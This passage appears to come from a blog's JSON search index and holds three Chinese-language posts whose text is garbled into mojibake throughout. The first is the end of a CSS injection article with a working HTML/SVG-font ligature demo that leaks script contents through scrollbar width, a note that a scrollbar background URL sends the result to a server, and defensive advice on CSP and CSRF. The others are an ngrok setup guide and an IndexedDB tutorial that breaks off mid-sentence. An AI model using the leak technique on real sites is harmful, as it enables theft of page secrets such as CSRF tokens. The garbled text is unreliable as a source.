ç«¯è¿…é€Ÿç”¢ç”Ÿå­—é«”ï¼Œæƒ³è¦çœ‹ç´°ç¯€ä»¥åŠç›¸é—œç¨‹å¼ç¢¼çš„è©±ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šStealing Data in Great style â€“ How to Use CSS to Attack Web Application.\nè€Œé€™é‚Šæˆ‘å°±ç°¡å–®åšå€‹ç°¡åŒ–åˆ°ä¸è¡Œçš„ demoï¼Œä¾†è­‰æ˜é€™ä»¶äº‹æƒ…æ˜¯å¯è¡Œçš„ã€‚ç‚ºäº†ç°¡åŒ–ï¼Œæœ‰äººåšäº†ä¸€å€‹ Safari ç‰ˆæœ¬çš„ demoï¼Œå› ç‚º Safari æ”¯æ´ SVG fontï¼Œæ‰€ä»¥ä¸éœ€è¦å†å¾ server ç”¢ç”Ÿå­—å‹ï¼ŒåŸå§‹æ–‡ç« åœ¨é€™è£¡ï¼šData Exfiltration via CSS + SVG Font - PoC (Safari only)\nç°¡æ˜“ç‰ˆ demoï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var secret = \u0026#34;abc123\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;script\u0026gt; var secret2 = \u0026#34;cba321\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;a\u0026#39; horiz-adv-x=\u0026#34;99999\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;style\u0026gt; script { display: block; font-family:\u0026#34;hack\u0026#34;; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; } script::-webkit-scrollbar { background: blue; } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æˆ‘ç”¨ script æ”¾äº†å…©æ®µ JSï¼Œè£¡é¢å…§å®¹åˆ†åˆ¥æ˜¯ var secret = \u0026quot;abc123\u0026quot; è·Ÿ var secret2 = \u0026quot;cba321\u0026quot;ï¼Œæ¥è‘—åˆ©ç”¨ CSS è¼‰å…¥æˆ‘æº–å‚™å¥½çš„å­—é«”ï¼Œåªè¦æœ‰ \u0026quot;a çš„é€£å­—ï¼Œå°±æœƒå¯¬åº¦è¶…å¯¬ã€‚\nå†ä¾†å¦‚æœ scrollbar æœ‰å‡ºç¾ï¼Œæˆ‘æŠŠèƒŒæ™¯è¨­æˆè—è‰²çš„ï¼Œæ¯”è¼ƒé¡¯çœ¼ï¼Œæœ€å¾Œçš„çµæœå¦‚ä¸‹ï¼š\nä¸Šé¢å› ç‚ºå…§å®¹æ˜¯ var secret = \u0026quot;abc123\u0026quot;ï¼Œæ‰€ä»¥ç¬¦åˆäº† \u0026ldquo;a çš„é€£å­—ï¼Œå› æ­¤å¯¬åº¦è®Šå¯¬ï¼Œscrollbar å‡ºç¾ã€‚\nä¸‹é¢å› ç‚ºæ²’æœ‰ \u0026quot;aï¼Œæ‰€ä»¥ scrollbar æ²’å‡ºç¾ï¼ˆæœ‰ a çš„åœ°æ–¹éƒ½æœƒç¼ºå­—ï¼Œæ‡‰è©²è·Ÿæˆ‘æ²’æœ‰å®šç¾©å…¶ä»–çš„ glyph æœ‰é—œï¼Œä½†ä¸å½±éŸ¿çµæœï¼‰\nåªè¦æŠŠ scrollbar çš„èƒŒæ™¯æ›æˆ URLï¼Œå°±å¯ä»¥å¾ server ç«¯çŸ¥é“ leak çš„çµæœã€‚\nå¦‚æœæƒ³çœ‹å¯¦éš›çš„ demo è·Ÿ server ç«¯çš„å¯«æ³•ï¼Œå¯ä»¥åƒè€ƒä¸Šé¢é™„çš„é‚£å…©ç¯‡æ–‡ç« ã€‚\né˜²ç¦¦æ–¹å¼ æœ€å¾Œæˆ‘å€‘ä¾†è¬›ä¸€ä¸‹é˜²ç¦¦æ–¹å¼ï¼Œæœ€ç°¡å–®æ˜ç­çš„ç•¶ç„¶å°±æ˜¯ç›´æ¥æŠŠ style å°èµ·ä¾†ä¸çµ¦ç”¨ï¼ŒåŸºæœ¬ä¸Šå°±ä¸æœƒæœ‰ CSS injection çš„å•é¡Œï¼ˆé™¤éå¯¦ä½œæ–¹å¼æœ‰æ¼æ´ï¼‰ã€‚\nå¦‚æœçœŸçš„è¦é–‹æ”¾ styleï¼Œä¹Ÿå¯ä»¥ç”¨ CSP ä¾†é˜»æ“‹ä¸€äº›è³‡æºçš„è¼‰å…¥ï¼Œä¾‹å¦‚èªª font-src å°±æ²’æœ‰å¿…è¦å…¨é–‹ï¼Œstyle-src ä¹Ÿå¯ä»¥è¨­ç½® allow listï¼Œå°±èƒ½å¤ æ“‹ä½ @import é€™å€‹èªæ³•ã€‚\nå†ä¾†ï¼Œä¹Ÿå¯ä»¥è€ƒæ…®åˆ°ã€Œå¦‚æœé é¢ä¸Šçš„æ±è¥¿è¢«æ‹¿èµ°ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ã€ï¼Œä¾‹å¦‚èªª CSRF token è¢«æ‹¿èµ°ï¼Œæœ€å£å°±æ˜¯ CSRFï¼Œæ­¤æ™‚å°±å¯ä»¥å¯¦ä½œæ›´å¤šçš„é˜²è­·å»é˜»æ“‹ CSRFï¼Œå°±ç®—æ”»æ“Šè€…å–å¾—äº† CSRF tokenï¼Œä¹Ÿæ²’è¾¦æ³• CSRFï¼ˆä¾‹å¦‚èªªå¤šæª¢æŸ¥ origin header ä¹‹é¡çš„ï¼‰ã€‚\nç¸½çµ CSS æœçœŸåšå¤§ç²¾æ·±ï¼ŒçœŸçš„å¾ˆä½©æœé€™äº›å‰è¼©å€‘å¯ä»¥æŠŠ CSS ç©å‡ºé€™éº¼å¤šèŠ±æ¨£ï¼Œç™¼å±•å‡ºé€™éº¼å¤šä»¤äººçœ¼ç•Œå¤§é–‹çš„æ”»æ“Šæ‰‹æ³•ã€‚ç•¶åˆåœ¨ç ”ç©¶çš„æ™‚å€™ï¼Œåˆ©ç”¨å±¬æ€§é¸æ“‡å™¨å» leak é€™å€‹æˆ‘å¯ä»¥ç†è§£ï¼Œç”¨ unicode-range æˆ‘ä¹Ÿèƒ½ç†è§£ï¼Œä½†æ˜¯é‚£å€‹ç”¨æ–‡å­—é«˜åº¦åŠ ä¸Š CSS animation å»è®ŠåŒ–çš„ï¼Œæˆ‘èŠ±äº†ä¸å°‘æ™‚é–“æ‰ææ‡‚é‚£åœ¨å¹¹å˜›ï¼Œé€£å­—é‚£å€‹é›–ç„¶æ¦‚å¿µå¥½æ‡‚ï¼Œä½†çœŸçš„è¦å¯¦ä½œé‚„æ˜¯æœƒç¢°åˆ°ä¸å°‘å•é¡Œã€‚\næœ€å¾Œï¼Œé€™å…©ç¯‡æ–‡ç« ä¸»è¦ç®—æ˜¯ä»‹ç´¹ä¸€ä¸‹ CSS injection é€™å€‹æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤å¯¦éš›çš„ç¨‹å¼ç¢¼ä¸¦ä¸å¤šï¼Œè€Œé€™äº›æ”»æ“Šæ‰‹æ³•éƒ½åƒè€ƒè‡ªå‰äººå€‘çš„æ–‡ç« ï¼Œåˆ—è¡¨æˆ‘æœƒé™„åœ¨ä¸‹é¢ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥é–±è®€åŸæ–‡ï¼Œæœƒè¬›å¾—æ›´è©³ç´°ä¸€é»ï¼Œå¦‚æœå°å“ªé …æ”»æ“Šæƒ³è¦æ·±å…¥äº†è§£ï¼Œä¹Ÿå¯ä»¥ç•™è¨€è·Ÿæˆ‘äº¤æµã€‚\n","date":"2022-10-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52401028978_fc63caee61_o.jpg","permalink":"https://wayneblog.ga/2022-10-03/css-injection/","title":"ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injection"},{"content":" åƒè€ƒæ–‡ç«  Alan Tsai çš„å­¸ç¿’ç­†è¨˜ Ngrokï¼šè®“æœ¬æ©Ÿæ¸¬è©¦æ™‚ä¹Ÿèƒ½æœ‰ HTTPS æ†‘è­‰ å‰è¨€ åœ¨é–‹ç™¼çš„éç¨‹ä¸­ï¼Œæœ‰æ™‚å€™æœƒéœ€è¦å¾å¦å¤–ä¸€è‡ºæ©Ÿå™¨æ¸¬è©¦åœ¨localçš„ç¶²ç«™åŠæœå‹™ã€‚æœ€å¸¸è¦‹çš„æƒ…æ³å°±æ˜¯ç•¶è¦æ¸¬è©¦ç¶²ç«™åœ¨æ‰‹æ©Ÿä¸Šçœ‹èµ·ä¾†é•·ä»€éº½æ¨£å­çš„æ™‚å€™ï¼Œæˆ–è€…æœ‰æ™‚å€™è¦è®“åˆ¥äººé€£åˆ°è‡ªå·±localçš„sql sererçš„æ™‚å€™ã€‚ ngrok å°±æ˜¯è®“é€™ä¸€åˆ‡è®Šå¾—å®¹æ˜“çš„å·¥å…·ï¼Œè€Œä¸”å¾ˆä½›å¿ƒçš„æ˜¯ï¼Œå…è²»ç‰ˆå°±å¤ ä¸€èˆ¬ä½¿ç”¨ã€‚ é‹ä½œæ¨¡å¼ ngrok å°±æ˜¯ä¸€å€‹ reverse proxy çš„å·¥å…·ï¼Œé€éæŠŠ local çš„ port map åˆ°ä¸€å€‹ public çš„åœ°å€ï¼Œè®“å¤–éƒ¨èƒ½å¤ é€éé€™å€‹ public åœ°å€é€£åˆ°ï¼Œç„¶å¾Œå·¥å…·ç”¨ reverse proxy å’Œ local å¯¦éš›çš„ port å–å¾—è³‡æ–™ã€‚ å› æ­¤æœ‰å€‹ç¼ºé»ï¼Œå°±æ˜¯é€Ÿåº¦ç›¸å°è¼ƒæ…¢ï¼Œå°¤å…¶æ˜¯ ngrok çš„ä¼ºæœå™¨åœ¨ç¾åœ‹å› æ­¤ä¹Ÿæœƒæ¸›å°‘ä¸€äº›é€Ÿåº¦ã€‚ä¸éå¦‚æœæ˜¯çˆ²äº†é–‹ç™¼æ¸¬è©¦ç”¨ï¼Œé€™å€‹å°±ä¸ç®—ç¼ºé»ã€‚ ngrok å…è²»ç‰ˆæœ¬æä¾›äº†ä¸€å€‹å‹•æ…‹çš„åœ°å€ï¼Œéœ€è¦é€²éšåŠŸèƒ½æˆ–è€…åŒæ™‚mapå¤šå€‹æœå‹™å°±éœ€è¦ä»˜è²»ã€‚ å®‰è£èˆ‡ä½¿ç”¨ éœ€å…ˆå®‰è£ unzip (è§£å£“ç¸®ç”¨) 1 yum install zip unzip æ­¥é©Ÿ 1 - åˆ°å®˜ç¶²ä¸‹è¼‰ç›¸å°æ‡‰ç³»çµ±çš„ ngrok å®‰è£åŒ… 1 2 ### ä»¥ linux 64 ç‚ºä¾‹ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip æ­¥é©Ÿ 2 - è§£å£“ç¸®å®‰è£åŒ…ä¸¦æ¬ç§»åˆ° /usr/bin/ ä¸­ 1 unzip ngrok-stable-linux-amd64.zip 1 mv ngrok /usr/bin/. æ­¥é©Ÿ 3 - åˆ° ngrok å®˜ç¶²è¨»å†Šä¸€å€‹å…è²»å¸³è™Ÿ æ­¥é©Ÿ 4 - å°‡ dashboard ä¸Šé¡¯ç¤ºçš„ token è¨­å®šè‡³æœ¬æ©Ÿ 1 ngrok authtoken XXXXXXXXXXXXXXXX é¡¯ç¤ºæ­¤ç•«é¢ä»£è¡¨å·²è¨­å®šå®Œæˆã€‚ æ­¥é©Ÿ 5 - å‡è¨­æœå‹™è·‘åœ¨æœ¬æ©Ÿçš„ port 3000ï¼Œå‰‡åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ 1 ngrok http 3000 é¡¯ç¤ºæ­¤ç•«é¢ä»£è¡¨å·²æˆåŠŸè·‘èµ·æœå‹™ï¼Œæ‰“é–‹ç¶²å€å³å¯ã€‚ ç›´åˆ° ngrok é—œæ‰æˆ– ngrok session éæœŸä¹‹å‰ï¼Œé€™å…©å€‹ URL éƒ½å¯ä»¥è¢«å…¬é–‹å­˜å–ã€‚ é€²éšä½¿ç”¨ å¤–é€£çš„ web æœå‹™åŠ å¯† æœ‰æ™‚å€™çµ¦åˆ¥äººæ¸¬è©¦çš„éˆæ¥ä¸å¸Œæœ›ä»»æ„çš„äººéƒ½èƒ½å¤ é–‹å•“ï¼Œngrokéå¸¸è²¼å¿ƒçš„æä¾›äº†é€™å€‹æœå‹™ã€‚ åªéœ€è¦åœ¨ mapping çš„æ™‚å€™åŠ ä¸Š auth é€™å€‹åƒæ•¸å°±å¯ä»¥è¨­å®šå¯†ç¢¼ä¿è­·ã€‚ä¾‹å¦‚ï¼š 1 ngrok http --auth=admin:12345 3000 æ„æ€æ˜¯ï¼Œè³¬è™Ÿè¦æ˜¯adminï¼Œè€Œå¯†ç¢¼æ˜¯12345 map åˆ° 3000 portã€‚ é‡å¯« hostname æœ‰äº›æœå‹™æœƒä½¿ç”¨åˆ° hostname çš„å€¼ï¼Œé€™å€‹æ™‚å€™é‡å¯« hostname çš„åŠŸèƒ½å°±è®Šå¾—å¾ˆé‡è¦ã€‚å¯ä»¥ä½¿ç”¨ host-header åšè¨­å®šã€‚ é€™é‚Šçš„ä¾‹å­ç”¨çš„æ˜¯åœ¨ IIS è£é¢è¨­å®šåªæœ‰ test.com æ‰æœƒ binding åˆ° 80 portï¼Œä½¿ç”¨çš„æŒ‡ä»¤å°±æ˜¯ï¼š 1 ngrok http --host-header=test.com 80 ","date":"2022-09-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52384429631_a48959b2b8_o.png","permalink":"https://wayneblog.ga/2022-09-26/ngrok-basic/","title":"é€é ngrok ç”¢ç”Ÿè‡¨æ™‚ç”¨çš„ç¶²å€åˆ°æŒ‡å®šæ©Ÿå™¨"},{"content":" åƒè€ƒç¶²ç«™1\nåƒè€ƒç¶²ç«™2\nIndexedDB ä»‹ç´¹ key-value çš„å„²å­˜å½¢å¼ï¼Œé€éç´¢å¼•åŠŸèƒ½ä¾†é«˜æ•ˆç‡æœå°‹è³‡æ–™ã€‚ åŒæºæ”¿ç­– same-origin policyï¼šåªèƒ½å–ç”¨åŒç¶²åŸŸä¸‹çš„è³‡æ–™ã€‚ Async API : æä¾›éåŒæ­¥ apiï¼Œå–®ç·šç¨‹çš„æ‡‰ç”¨ä¸‹å–ç”¨è³‡æ–™æ™‚å°±ä¸æœƒæœ‰ block the main thread çš„æƒ…æ³é€ æˆä½¿ç”¨è€…é«”é©—ä¸ä½³ã€‚ transaction : èƒ½å¤ ç¢ºä¿å¤§é‡å¯«å…¥è³‡æ–™æ™‚çš„å®Œæ•´æ€§ï¼Œå¦‚æœæœ‰å–®ç­†è³‡æ–™å¯«å…¥å¤±æ•—æœƒå…¨æ•¸ rollbackã€‚ ç›¸å®¹æ€§ å¤§éƒ¨åˆ†çš„ç€è¦½å™¨éƒ½å·²ç¶“æ”¯æ´ä½¿ç”¨ï¼Œåƒé–±ï¼šWhen Can I Use IndexedDB å„²å­˜é™åˆ¶ å–®ä¸€è³‡æ–™åº«é …ç›®çš„å®¹é‡/å¤§å°ä¸¦æ²’æœ‰ä»»ä½•é™åˆ¶ï¼Œä½†æ˜¯å„å€‹ IndexedDBè³‡æ–™åº«çš„å®¹é‡å°±æœ‰é™åˆ¶ï¼Œä¸”æ ¹æ“šå„ç€è¦½å™¨å…¶é™åˆ¶æœƒä¸åŒã€‚\nChromeï¼šå…è¨±ç€è¦½å™¨ä½¿ç”¨å¤šé”ç¸½ç£ç›¤ç©ºé–“çš„60ï¼…ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨StorageManager APIä¾†ç¢ºå®šå¯ç”¨çš„æœ€å¤§é…é¡ã€‚ å…¶ä»–åŸºæ–¼Chromiumçš„ç€è¦½å™¨å¯èƒ½å…è¨±è©²ç€è¦½å™¨ä½¿ç”¨æ›´å¤šå­˜å„²ç©ºé–“ã€‚ Internet Explorer 10 å’Œæ›´é«˜ç‰ˆæœ¬ï¼šæœ€å¤šå¯ä»¥å­˜å„²250MBï¼Œä¸¦ä¸”åœ¨ä½¿ç”¨äº†10MBä»¥ä¸Šæ™‚å°‡æç¤ºç”¨æˆ¶ã€‚ Firefoxï¼šå…è¨±ä¸€å€‹ä¾†æºæœ€å¤šä½¿ç”¨2GBã€‚ æ‚¨å¯ä»¥ä½¿ç”¨StorageManager APIä¾†ç¢ºå®šä»æœ‰å¤šå°‘å¯ç”¨ç©ºé–“ã€‚ Safari (both desktop and mobile) ä¼¼ä¹æœ€å¤šå¯å®¹ç´1GBï¼Œé”åˆ°é™åˆ¶å¾Œï¼ŒSafariæœƒæç¤ºç”¨æˆ¶ï¼Œä»¥200MBç‚ºå¢é‡å¢åŠ é™åˆ¶ã€‚ refer to storage-for-the-web\nè³‡æ–™éµ(Key) data type: string, date, floatå’Œ array å¿…é ˆæ˜¯èƒ½æ’åºçš„å€¼(ç„¡æ³•è™•ç†å¤šåœ‹èªè¨€å­—ä¸²æ’åº) ç‰©ä»¶å­˜æª”æœ‰ä¸‰ç¨®æ–¹å¼ç”¢ç”Ÿè³‡æ–™éµ: è³‡æ–™éµç”¢ç”Ÿå™¨ (key generator)ã€è³‡æ–™éµè·¯å¾‘ (key path) ä»¥åŠæŒ‡å®šå€¼ã€‚ è³‡æ–™éµç”¢ç”Ÿå™¨ (key generator)ï¼šç”¨ç”¢ç”Ÿå™¨è‡ªå‹•ç”¢ç”Ÿè³‡æ–™éµã€‚ è³‡æ–™éµè·¯å¾‘ (key path)ï¼šç©ºå­—ä¸²æˆ–æ˜¯javascript identifierï¼ˆåŒ…å«ç”¨ \u0026ldquo;.\u0026rdquo; åˆ†éš”ç¬¦è™Ÿçš„åç¨±ï¼‰ä¸”è·¯å¾‘ä¸èƒ½æœ‰ç©ºç™½ (å¯¦æ¸¬éä¸­æ–‡æœƒè¢«è½‰æˆç©ºå­—ä¸²)ã€‚ åŸºæœ¬æ“ä½œæ­¥é©Ÿ æ“ä½œIndexedDBçš„åŸºæœ¬æ­¥é©Ÿå»ºè­°å¦‚ä¸‹ï¼š é–‹å•Ÿè³‡æ–™åº«å’Œäº¤æ˜“(transaction) å»ºç«‹ç‰©ä»¶å­˜æª”(object store) ç™¼å‡ºè³‡æ–™åº«æ“ä½œè«‹æ±‚ï¼Œä¾‹å¦‚æ–°å¢æˆ–å–å¾—è³‡æ–™ è†è½å°æ‡‰DOMäº‹ä»¶ç­‰å¾…æ“ä½œå®Œæˆ å¾resultç‰©ä»¶ä¸Šå–å¾—çµæœé€²è¡Œå…¶ä»–å·¥ä½œ ä½¿ç”¨æ–¹å¼ 1. è©¦é©—ç€è¦½å™¨çš„å‰ç¶´æ¨™ç¤º å¦‚æœéœ€è¦è©¦é©—ç€è¦½å™¨çš„å‰ç¶´æ¨™ç¤ºï¼Œå¯ä»¥å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 // In the following line, you should include the prefixes of implementations you want to test. window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; // DON\u0026#39;T use \u0026#34;var indexedDB = ...\u0026#34; if you\u0026#39;re not in a function. // Moreover, you may need references to some window.IDB* objects: window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; // (Mozilla has never prefixed these objects, so we don\u0026#39;t need window.mozIDB*) è«‹æ³¨æ„ç€è¦½å™¨å‰ç¶´æ¨™ç¤ºçš„å¯¦ä½œå¯èƒ½ä¸å®Œæ•´ã€æœ‰äº›å•é¡Œæˆ–ä»ç„¶éµå®ˆèˆŠç‰ˆæ¨™æº–ï¼Œå› æ­¤ä¸å»ºè­°åœ¨æ­£å¼ç‰ˆç¨‹å¼ç¢¼ä¸­ä½¿ç”¨ã€‚èˆ‡å…¶å®£ç¨±æ”¯æ´åˆæœ‰å•é¡Œï¼Œå€’ä¸å¦‚ç›´æ¥ä¸æ”¯æ´ã€‚ 1 2 3 if (!window.indexedDB) { window.alert(\u0026#34;Your browser doesn\u0026#39;t support a stable version of IndexedDB. Such and such feature will not be available.\u0026#34;); } 2. é–‹å•Ÿè³‡æ–™åº« 1 2 3 4 5 6 7 8 9 // Let us open database let request = window.indexedDB.open(\u0026#34;DBåç¨±\u0026#34;, 3); request.onerror = function(event) { // Do something with request.errorCode! }; request.onsuccess = function(event) { // Do something with request.result! }; é–‹å•Ÿè«‹æ±‚ä¸¦ä¸æœƒç«‹åˆ»é–‹å•Ÿè³‡æ–™åº«æˆ–äº¤æ˜“ï¼Œå‘¼å«open()æ–¹æ³•æœƒå›å‚³ä¸€å€‹IDBOpenDBRequestç‰©ä»¶ï¼Œé€™å€‹ç‰©ä»¶æ“æœ‰å…©å€‹äº‹ä»¶(success å’Œ error)ã€‚å¤§éƒ¨åˆ†IndexedDBçš„éåŒæ­¥åŠŸèƒ½éƒ½æœƒå›å‚³ä¸€å€‹IDBDatabaseé¡ç‰©ä»¶ï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥è¨»å†ŠæˆåŠŸå’Œå¤±æ•—äº‹ä»¶è™•ç†å™¨ã€‚ .open()æ–¹æ³•ç¬¬äºŒå€‹åƒæ•¸æ˜¯è³‡æ–™åº«ç‰ˆæœ¬ï¼Œè³‡æ–™åº«ç‰ˆæœ¬æ±ºå®šäº†è³‡æ–™åº«çµæ§‹ï¼Œä¹Ÿå°±æ˜¯è³‡æ–™åº«ç‰©ä»¶å­˜æª”çš„çµæ§‹ã€‚å¦‚æœè«‹æ±‚ç‰ˆæœ¬ä¸å­˜åœ¨(æ¯”å¦‚å› ç‚ºé€™æ˜¯ä¸€å€‹æ–°è³‡æ–™åº«æˆ–æ˜¯è³‡æ–™åº«ç‰ˆæœ¬å·²å‡ç´š)ï¼Œonupgradeneededäº‹ä»¶æœƒè¢«è§¸ç™¼ï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥åœ¨onupgradeneededäº‹ä»¶è™•ç†å™¨ä¸­å†å»ºç«‹æ–°çš„ç‰ˆæœ¬ï¼Œä¸‹é¢å‡ç´šè³‡æ–™åº«ç‰ˆæœ¬æœ‰æ›´è©³ç´°çš„èªªæ˜ã€‚ 3. ä½¿ç”¨è³‡æ–™éµç”¢ç”Ÿå™¨ ç•¶å»ºç«‹ç‰©ä»¶å­˜æª”æ™‚è¨­å®šautoIncrementæ——æ¨™ç‚ºtureå°‡å•Ÿå‹•è³‡æ–™éµç”¢ç”Ÿå™¨ï¼Œé è¨­ä¸Šè©²æ——æ¨™ç‚ºfalseã€‚ æœ‰äº†è³‡æ–™éµç”¢ç”Ÿå™¨ï¼Œç•¶æ–°å¢è³‡æ–™åˆ°ç‰©ä»¶å­˜æª”ä¸­ï¼Œè³‡æ–™éµç”¢ç”Ÿå™¨æœƒè‡ªå‹•å¹«æˆ‘å€‘ç”¢ç”Ÿè³‡æ–™éµã€‚è³‡æ–™éµç”¢ç”Ÿå™¨ç”¢ç”Ÿçš„è³‡æ–™éµç”±æ•´æ•¸1é–‹å§‹ï¼Œè€ŒåŸºæœ¬ä¸Šæ–°ç”¢ç”Ÿçš„è³‡æ–™éµæ˜¯ç”±å‰ä¸€å€‹è³‡æ–™éµåŠ 1ç”¢ç”Ÿã€‚è³‡æ–™éµçš„ç”¢ç”Ÿä¸æœƒå› ç‚ºè³‡æ–™åˆªé™¤æˆ–æ¸…ç©ºæ‰€æœ‰è³‡æ–™è€Œé‡æ–°é–‹å§‹èµ·ç®—ï¼Œæ‰€ä»¥è³‡æ–™éµå€¼æ˜¯ä¸€ç›´ç´¯åŠ ä¸Šå»çš„ï¼Œé™¤éè³‡æ–™åº«æ“ä½œä¸­æ–·ï¼Œæ•´å€‹äº¤æ˜“ä½œæ¥­è¢«å–æ¶ˆã€‚ æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹æœ‰è³‡æ–™éµç”¢ç”Ÿå™¨çš„ç‰©ä»¶å­˜æª”å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Open the indexedDB. var request = indexedDB.open(dbName, 3); request.onupgradeneeded = function (event) { var db = event.target.result; // Create another object store called \u0026#34;names\u0026#34; with the autoIncrement flag set as true. var objStore = db.createObjectStore(\u0026#34;names\u0026#34;, { autoIncrement : true }); // Because the \u0026#34;names\u0026#34; object store has the key generator, the key for the name value is generated automatically. // The added records would be like: // key : 1 =\u0026gt; value : \u0026#34;Bill\u0026#34; // key : 2 =\u0026gt; value : \u0026#34;Donna\u0026#34; for (var i in customerData) { objStore.add(customerData[i].name); } } é—œæ–¼è³‡æ–™éµç”¢ç”Ÿå™¨ç´°ç¯€ï¼Œè«‹åƒè€ƒ\u0026ldquo;W3C Key Generators\u0026rdquo;ã€‚\n4. æ–°å¢å’Œåˆªé™¤è³‡æ–™ åœ¨æ“ä½œè³‡æ–™åº«ä¹‹å‰å¿…é ˆè¦å…ˆé€²è¡Œäº¤æ˜“ï¼Œäº¤æ˜“ä¾†è‡ªè³‡æ–™åº«ç‰©ä»¶ï¼Œåœ¨äº¤æ˜“ä¸­è¦æŒ‡å®šæ¶µè“‹ç‰©ä»¶å­˜æª”ç¯„åœï¼Œç„¶å¾Œä¹Ÿè¦æ±ºå®šæ˜¯è¦è®Šæ›´è³‡æ–™åº«æˆ–ç´”ç²¹è®€å–è³‡æ–™ã€‚ äº¤æ˜“å…±æœ‰ä¸‰ç¨®ç¨®é¡ï¼Œåˆ†åˆ¥æ˜¯è®€å–(read-only)ï¼Œè®€å¯«(read/write), ä»¥åŠç‰ˆæœ¬è®Šæ›´(versionchange)ï¼Œå¦‚æœåªéœ€è¦è®€è³‡æ–™æœ€å¥½åªä½¿ç”¨è®€å–(read-only)äº¤æ˜“ï¼Œå› ç‚ºè®€å–(read-only)äº¤æ˜“å¯ä»¥å¤šé‡åŒæ­¥é€²è¡Œã€‚ å‰µå»ºè³‡æ–™åº«å¾Œï¼Œå¦‚æœè¦å¯«å…¥è³‡æ–™è«‹é€™éº¼åšï¼š 1 2 3 4 var transaction = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;); // Note: Older experimental implementations use the deprecated constant IDBTransaction.READ_WRITE instead of \u0026#34;readwrite\u0026#34;. // In case you want to support such an implementation, you can just write: // var transaction = db.transaction([\u0026#34;customers\u0026#34;], IDBTransaction.READ_WRITE); å‘¼å« transaction() æ–¹æ³•æœƒå›å‚³ä¸€å€‹äº¤æ˜“ç‰©ä»¶ã€‚transaction()ç¬¬ä¸€å€‹æ¥å—åƒæ•¸ä»£è¡¨äº¤æ˜“æ¶µè“‹çš„ç‰©ä»¶å­˜æª”ï¼Œé›–ç„¶å‚³å…¥ç©ºé™£åˆ—æœƒè®“äº¤æ˜“æ¶µè“‹æ‰€æœ‰ç‰©ä»¶å­˜æª”ï¼Œä½†è«‹ä¸è¦é€™éº¼åšï¼Œå› ç‚ºæ ¹æ“šæ­£å¼æ¨™æº–å‚³å…¥ç©ºé™£åˆ—æ‡‰è©²è¦å°è‡´InvalidAccessErroréŒ¯èª¤ï¼›ç¬¬äºŒå€‹åƒæ•¸ä»£è¡¨äº¤æ˜“ç¨®é¡ï¼Œä¸å‚³å…¥çš„è©±é è¨­ç‚ºè®€å–äº¤æ˜“ï¼Œæœ¬ä¾‹è¦å¯«å…¥è³‡æ–™åº«æ‰€ä»¥å‚³å…¥è®€å¯«(\u0026ldquo;readwrite\u0026rdquo;)ã€‚ äº¤æ˜“çš„ç”Ÿå‘½é€±æœŸå’Œäº‹ä»¶å¾ªç’°é—œä¿‚å¯†åˆ‡ã€‚ç•¶æˆ‘å€‘ç™¼èµ·äº¤æ˜“åˆå›åˆ°äº‹ä»¶å¾ªç’°ä¸­å¾Œï¼Œå¦‚æœå¿½ç•¥ï¼Œé‚£éº¼äº¤æ˜“å°‡è½‰æˆçµæŸï¼Œå”¯ä¸€ä¿æŒäº¤æ˜“å­˜æ´»çš„æ–¹æ³•æ˜¯åœ¨äº¤æ˜“ä¸Šç™¼å‡ºè«‹æ±‚ï¼›ç•¶è«‹æ±‚å®Œæˆå¾Œæˆ‘å€‘æœƒæ”¶åˆ°DOMäº‹ä»¶ï¼Œå‡è¨­è«‹æ±‚çµæœæˆåŠŸï¼Œæˆ‘å€‘å¯ä»¥åœ¨äº‹ä»¶çš„å›å‘¼å‡½æ•¸(callbackä¸­)ç¹¼çºŒé€²è¡Œäº¤æ˜“ï¼Œåä¹‹ï¼Œå¦‚æœæˆ‘å€‘æ²’æœ‰ç¹¼çºŒé€²è¡Œäº¤æ˜“ï¼Œé‚£éº¼äº¤æ˜“å°‡çµæŸï¼Œä¹Ÿå°±æ˜¯èªªåªè¦å°šæœ‰æœªå®Œæˆè«‹æ±‚çš„è©±ï¼Œäº¤æ˜“å°±æœƒç¹¼çºŒå­˜æ´»ï¼Œå¦‚æœæ”¶åˆ°TRANSACTION_INACTIVE_ERRéŒ¯èª¤é‚£ä¾¿æ„è¬‚è‘—äº¤æ˜“æ—©å·²çµæŸï¼Œæˆ‘å€‘éŒ¯éäº†ç¹¼çºŒé€²è¡Œäº¤æ˜“çš„æ©